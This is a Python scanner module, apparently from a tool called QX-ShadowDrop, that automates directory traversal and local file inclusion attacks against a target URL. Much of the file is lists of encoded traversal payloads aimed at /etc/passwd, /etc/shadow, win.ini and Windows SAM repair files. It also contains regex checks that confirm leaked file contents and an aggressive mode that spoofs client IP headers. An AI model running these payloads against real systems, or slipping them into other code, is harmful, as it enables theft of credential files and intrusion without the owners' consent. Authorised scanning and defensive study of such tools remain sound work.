

#!/usr/bin/env python3
import time
import random
import re
import urllib3
from urllib.parse import urlparse, urlunparse, urlencode, parse_qsl
from typing import List, Dict, Any, Optional
import requests
from config import settings
from .vulnerability_base import VulnerabilityModule
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Scanner(VulnerabilityModule):
    name = "directory_traversal"
    enabled = True
    timeout = getattr(settings, "TIMEOUT", 10)
    user_agent = getattr(settings, "USER_AGENT", "QX-ShadowDrop/3.0")
    max_tests_per_param = 8 if not getattr(settings, "AGGRESSIVE", False) else 15
    delay_range = (0.1, 0.25)
    aggressive = getattr(settings, "AGGRESSIVE", False)
    debug_mode = getattr(settings, "DEBUG", False)
    
    BASE_PATTERNS = [
        "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
        "../../windows/win.ini", "../../../windows/win.ini", "../../../../windows/win.ini",
        "../../boot.ini", "../../../boot.ini", "../../../../boot.ini",
        "....//....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\win.ini", "..\\..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "....\\....\\....\\windows\\win.ini",
        "..%255c..%255c..%255cwindows%255cwin.ini", "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini", "..%252e..%252e..%252eetc%252fpasswd",
        "..%%32%65..%%32%65..%%32%65etc%%32%66passwd", "..%u2215..%u2215..%u2215etc%u2215passwd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"
    ]
    
    EXTRA_NORMAL = [
        "....//....//....//etc//passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%5c..%5c..%5cwindows%5cwin.ini", "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini", "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%255c..%255c..%255c..%255cwindows%255cwin.ini", "..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini",
        "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini", "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini",
        "..%252e..%252e..%252e..%252eetc%252fpasswd", "..%252e..%252e..%252e..%252e..%252eetc%252fpasswd",
        "..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66passwd", "..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66passwd",
        "..%u2215..%u2215..%u2215..%u2215etc%u2215passwd", "..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd", "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        "....\\\\....\\\\....\\\\windows\\\\win.ini", "....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini",
        "..%2f..%2f..%2fetc%2fshadow", "..%2f..%2f..%2f..%2fetc%2fshadow",
        "..%5c..%5c..%5cwindows%5crepair", "..%5c..%5c..%5c..%5cwindows%5crepair",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fgroup", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fgroup",
        "..%255c..%255c..%255cwindows%255csystem32", "..%255c..%255c..%255c..%255cwindows%255csystem32",
        "..%c0%af..%c0%afetc%c0%afshadow", "..%c0%af..%c0%af..%c0%afetc%c0%afshadow",
        "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9crepair", "..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9crepair",
        "..%252e..%252e..%252eetc%252fshadow", "..%252e..%252e..%252e..%252eetc%252fshadow",
        "..%%32%65..%%32%65..%%32%65etc%%32%66shadow", "..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66shadow",
        "..%u2215..%u2215..%u2215etc%u2215shadow", "..%u2215..%u2215..%u2215..%u2215etc%u2215shadow",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fshadow", "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fshadow"
    ]
    
    EXTRA_AGGRESSIVE = [
        "....//....//....//....//etc//passwd", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini", "..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini", "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%255c..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini", "..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini",
        "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini", "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini",
        "..%252e..%252e..%252e..%252e..%252e..%252eetc%252fpasswd", "..%252e..%252e..%252e..%252e..%252e..%252e..%252eetc%252fpasswd",
        "..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66passwd", "..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66passwd",
        "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd", "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd", "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        "....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini", "....\\\\....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow", "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow",
        "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5crepair", "..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5crepair",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fgroup", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fgroup",
        "..%255c..%255c..%255c..%255c..%255c..%255cwindows%255csystem32", "..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows%255csystem32",
        "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afshadow", "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afshadow",
        "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9crepair", "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9crepair",
        "..%252e..%252e..%252e..%252e..%252e..%252eetc%252fshadow", "..%252e..%252e..%252e..%252e..%252e..%252e..%252eetc%252fshadow",
        "..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66shadow", "..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66shadow",
        "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215shadow", "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215shadow",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fshadow", "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fshadow",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00", "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.html",
        "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00", "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00.txt",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00.jpg",
        "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini%00", "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini%00.png",
        "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd%00", "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd%00.pdf",
        "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini%00", "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini%00.doc",
        "..%252e..%252e..%252e..%252e..%252e..%252e..%252e..%252eetc%252fpasswd%00", "..%252e..%252e..%252e..%252e..%252e..%252e..%252e..%252eetc%252fpasswd%00.xml",
        "..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66passwd%00", "..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66passwd%00.json",
        "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd%00", "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd%00.txt",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd%00", "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd%00.html",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini", "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini", "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini",
        "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini", "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini",
        "..%252e..%252e..%252e..%252e..%252e..%252e..%252e..%252e..%252eetc%252fpasswd", "..%252e..%252e..%252e..%252e..%252e..%252e..%252e..%252e..%252e..%252eetc%252fpasswd",
        "..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66passwd", "..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66passwd",
        "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd", "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd", "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        "....\\\\....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini", "....\\\\....\\\\....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow", "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow",
        "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5crepair", "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5crepair",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fgroup", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fgroup",
        "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows%255csystem32", "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows%255csystem32",
        "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afshadow", "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afshadow",
        "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9crepair", "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9crepair",
        "..%252e..%252e..%252e..%252e..%252e..%252e..%252e..%252e..%252eetc%252fshadow", "..%252e..%252e..%252e..%252e..%252e..%252e..%252e..%252e..%252e..%252eetc%252fshadow",
        "..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66shadow", "..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65..%%32%65etc%%32%66shadow",
        "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215shadow", "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215shadow",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fshadow", "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fshadow"
    ]
    
    EXPECTED_CONTENT_PATTERNS = {
        "etc/passwd": [
            r'root:[x*]:\d+:\d+:',
            r'daemon:[x*]:\d+:\d+:',
            r'bin:[x*]:\d+:\d+:',
            r'sys:[x*]:\d+:\d+:',
            r'nologin|/bin/false',
            r'/home/',
        ],
        "etc/shadow": [
            r'root:\$[1-6]\$[^:]+:',
            r'[^:]+:\$[1-6]\$[^:]+:\d+:\d+:\d+:\d+:::',
            r'::\d+:\d+:\d+:\d+:::',
        ],
        "windows/win.ini": [
            r'\[fonts\]',
            r'\[extensions\]',
            r'\[mci extensions\]',
            r'\[files\]',
            r'=',
        ],
        "boot.ini": [
            r'\[boot loader\]',
            r'timeout=\d+',
            r'default=multi',
            r'\[operating systems\]',
        ],
        "windows/system32": [
            r'\.dll|\.exe|\.sys',
            r'System32|drivers|etc',
        ],
        "windows/repair": [
            r'\.sam|\.system|\.security',
            r'SAM|SYSTEM|SECURITY',
        ]
    }
    
    STRONG_INDICATORS = {
        "etc/passwd": [
            "root:x:0:0:",
            "daemon:x:1:1:",
            "bin:x:2:2:",
            "sys:x:3:3:",
            "/bin/bash",
            "/bin/sh",
            "/usr/sbin/nologin",
        ],
        "etc/shadow": [
            "root:$",
            ":::",
        ],
        "windows/win.ini": [
            "[fonts]",
            "[extensions]",
            "[mci extensions]",
        ],
        "boot.ini": [
            "[boot loader]",
            "[operating systems]",
        ]
    }
    
    WEAK_INDICATORS = [
        "root:x:", "[extensions]", "localhost", "[boot loader]",
        "system32", "error", "[fonts]", "for 16-bit app support", "[mci extensions]",
        "nobody:x:", "daemon:x:", "bin:x:", "sys:x:", "sync:x:", "games:x:",
        "[mail", "[drive", "[devices", "[386enh", "[network", "[password",
        "mysql", "apache", "httpd", "www-data", "administrator", "sql",
        "database", "config", "settings", "connection", "db_password"
    ]
    
    SENSITIVE_PARAMS = ["file", "path", "dir", "document", "page", "load", "include", "view", "template", "config", "settings", "data", "content", "src", "url", "redirect"]
    
    def __init__(self, target: str, **kwargs):
        super().__init__(target, **kwargs)
        self.session = requests.Session()
        self.session.verify = False
        self.custom_payloads = kwargs.get('custom_payloads', [])
        self.baseline_content = None
        
        self.TRAVERSAL_PATTERNS = self.BASE_PATTERNS[:]
        if self.aggressive:
            self.TRAVERSAL_PATTERNS.extend(self.EXTRA_AGGRESSIVE)
            self.max_tests_per_param = 20
            self.delay_range = (0.05, 0.15)
        else:
            self.TRAVERSAL_PATTERNS.extend(self.EXTRA_NORMAL)
            
        if getattr(settings, "USE_PROXY", False):
            proxy_config = getattr(settings, "PROXY_SETTINGS", {})
            self.session.proxies.update(proxy_config)
    
    def _headers(self, extra: Optional[Dict[str, str]] = None) -> Dict[str, str]:
        headers = {
            "User-Agent": self.user_agent,
            "X-Scanner": "QX-ShadowDrop",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        if self.aggressive:
            headers.update({
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Client-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Referer": self.target,
                "X-Requested-With": "XMLHttpRequest"
            })
        if extra:
            headers.update(extra)
        return headers
    
    def _sorted_params(self, params: List[str]) -> List[str]:
        priority_params = [p for p in params if p.lower() in self.SENSITIVE_PARAMS]
        other_params = [p for p in params if p.lower() not in self.SENSITIVE_PARAMS]
        return priority_params + other_params
    
    def _get_baseline_response(self):
        try:
            response = self.session.get(
                self.target,
                headers=self._headers(),
                timeout=self.timeout,
                allow_redirects=True,
                verify=False
            )
            self.baseline_content = {
                "length": len(response.content),
                "hash": hash(response.text),
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "text": response.text
            }
            return True
        except Exception as e:
            if self.debug_mode:
                print(f"[DEBUG] Failed to get baseline response: {e}")
            return False
    
    def _build_test_cases(self) -> List[Dict[str, Any]]:
        parsed = urlparse(self.target)
        queries = dict(parse_qsl(parsed.query, keep_blank_values=True))
        test_cases = []
        
        if queries:
            for param in self._sorted_params(list(queries.keys()))[:self.max_tests_per_param]:
                for payload in self.TRAVERSAL_PATTERNS:
                    new_query = queries.copy()
                    new_query[param] = payload
                    test_url = parsed._replace(query=urlencode(new_query, doseq=True))
                    test_cases.append({
                        "url": urlunparse(test_url),
                        "param": param,
                        "payload": payload,
                        "vector": "query"
                    })
                    
                    encoded_payload = payload.replace("../", "%2e%2e/").replace("..\\", "%2e%2e\\")
                    new_query_encoded = queries.copy()
                    new_query_encoded[param] = encoded_payload
                    test_url_encoded = parsed._replace(query=urlencode(new_query_encoded, doseq=True))
                    test_cases.append({
                        "url": urlunparse(test_url_encoded),
                        "param": param,
                        "payload": encoded_payload,
                        "vector": "query_encoded"
                    })
                    
                if self.aggressive and self.custom_payloads:
                    for payload in self.custom_payloads:
                        new_query_custom = queries.copy()
                        new_query_custom[param] = payload
                        test_url_custom = parsed._replace(query=urlencode(new_query_custom, doseq=True))
                        test_cases.append({
                            "url": urlunparse(test_url_custom),
                            "param": param,
                            "payload": payload,
                            "vector": "query_custom"
                        })
        else:
            base_url = self.target.rstrip("/")
            for payload in self.TRAVERSAL_PATTERNS[:12]:
                test_cases.append({
                    "url": f"{base_url}?file={payload}",
                    "param": "file",
                    "payload": payload,
                    "vector": "query"
                })
        
        return test_cases[:75] if not self.aggressive else test_cases[:200]
    
    def _identify_target_file(self, payload: str) -> str:
        payload_lower = payload.lower()
        
        if "etc/passwd" in payload_lower:
            return "etc/passwd"
        elif "etc/shadow" in payload_lower:
            return "etc/shadow"
        elif "windows/win.ini" in payload_lower or "win.ini" in payload_lower:
            return "windows/win.ini"
        elif "boot.ini" in payload_lower:
            return "boot.ini"
        elif "windows/system32" in payload_lower or "system32" in payload_lower:
            return "windows/system32"
        elif "windows/repair" in payload_lower or "repair" in payload_lower:
            return "windows/repair"
        
        return None
    
    def _detect_lfi(self, content: str, content_type: str, payload: str) -> bool:
        if not content or len(content) < 50:
            return False
            
        if "text/html" in content_type and ("<html" in content.lower() or "<body" in content.lower()):
            return False
            
        if self.baseline_content and hash(content) == self.baseline_content["hash"]:
            return False
            
        content_lower = content.lower()
        target_file = self._identify_target_file(payload)
        
        if not target_file:
            weak_indicator_count = sum(1 for indicator in self.WEAK_INDICATORS if indicator in content_lower)
            
            if weak_indicator_count >= 3:
                lines = content.split('\n')
                if len(lines) > 5:
                    colon_separated = sum(1 for line in lines if ':' in line and len(line.split(':')) > 2)
                    if colon_separated > len(lines) * 0.3:
                        return True
            
            return False
        
        if target_file in self.EXPECTED_CONTENT_PATTERNS:
            patterns_matched = 0
            for pattern in self.EXPECTED_CONTENT_PATTERNS[target_file]:
                if re.search(pattern, content):
                    patterns_matched += 1
            
            if patterns_matched < 2:
                return False
            
            strong_indicator_found = False
            if target_file in self.STRONG_INDICATORS:
                for indicator in self.STRONG_INDICATORS[target_file]:
                    if indicator in content_lower:
                        strong_indicator_found = True
                        break
            
            if not strong_indicator_found:
                return False
            
            if target_file == "etc/passwd":
                lines = content.split('\n')
                valid_entries = 0
                for line in lines:
                    if line.strip() and not line.startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 7:
                            valid_entries += 1
                
                if valid_entries < 3:
                    return False
            
            elif target_file == "windows/win.ini":
                lines = content.split('\n')
                section_count = 0
                key_value_count = 0
                
                for line in lines:
                    line = line.strip()
                    if line.startswith('[') and line.endswith(']'):
                        section_count += 1
                    elif '=' in line and not line.startswith(';') and not line.startswith('#'):
                        key_value_count += 1
                
                if section_count < 2 or key_value_count < 5:
                    return False
            
            elif target_file == "boot.ini":
                if "[boot loader]" not in content_lower or "[operating systems]" not in content_lower:
                    return False
                
                if "timeout=" not in content_lower or "default=" not in content_lower:
                    return False
            
            return True
        
        return False
    
    def _execute_test(self, test_case: Dict[str, Any]) -> Dict[str, Any]:
        try:
            time.sleep(random.uniform(*self.delay_range))
            response = self.session.get(
                test_case["url"],
                headers=self._headers(),
                timeout=self.timeout,
                allow_redirects=False,
                verify=False
            )
            
            content_type = response.headers.get("Content-Type", "").lower()
            is_vulnerable = self._detect_lfi(response.text, content_type, test_case["payload"])
            
            result = {
                **test_case,
                "vulnerable": is_vulnerable,
                "status_code": response.status_code,
                "content_length": len(response.content),
                "content_type": content_type,
                "response_time": response.elapsed.total_seconds()
            }
            
            if self.debug_mode and is_vulnerable:
                print(f"[DEBUG] LFI detected: {test_case['url']}")
            
            return result
        except Exception as e:
            if self.debug_mode:
                print(f"[DEBUG] Test failed: {test_case['url']} - {e}")
            return {**test_case, "error": str(e)}
    
    def scan(self) -> Dict[str, Any]:
        try:
            if self.debug_mode:
                print(f"[DEBUG] Starting directory traversal scan for {self.target}")
                print(f"[DEBUG] Aggressive mode: {self.aggressive}")
                print(f"[DEBUG] Custom payloads: {len(self.custom_payloads)}")
            
            evidence = []
            vulnerable_count = 0
            
            if not self._get_baseline_response():
                if self.debug_mode:
                    print("[DEBUG] Failed to get baseline response, continuing without it")
            
            test_cases = self._build_test_cases()
            if self.debug_mode:
                print(f"[DEBUG] Generated {len(test_cases)} test cases")
            
            for i, test_case in enumerate(test_cases):
                if self.debug_mode and i % 10 == 0:
                    print(f"[DEBUG] Testing case {i+1}/{len(test_cases)}")
                
                result = self._execute_test(test_case)
                if result.get("vulnerable"):
                    evidence.append(result)
                    vulnerable_count += 1
                    if self.debug_mode:
                        print(f"[VULNERABLE] Found LFI: {test_case['url']}")
            
            risk_level = "high" if vulnerable_count > 0 else "low"
            if vulnerable_count > 2:
                risk_level = "critical"
            
            return {
                "ok": True,
                "risk": risk_level,
                "vulnerabilities_found": vulnerable_count,
                "total_tests": len(test_cases),
                "evidence": evidence,
                "notes": f"Tests performed: {len(test_cases)}, Vulnerabilities found: {vulnerable_count}"
            }
        except Exception as e:
            if self.debug_mode:
                print(f"[CRITICAL ERROR] {str(e)}")
            return {
                "ok": False,
                "risk": "unknown",
                "error": str(e),
                "vulnerabilities_found": 0,
                "total_tests": 0
            }
    
    def run(self) -> Dict[str, Any]:
        return self.scan()
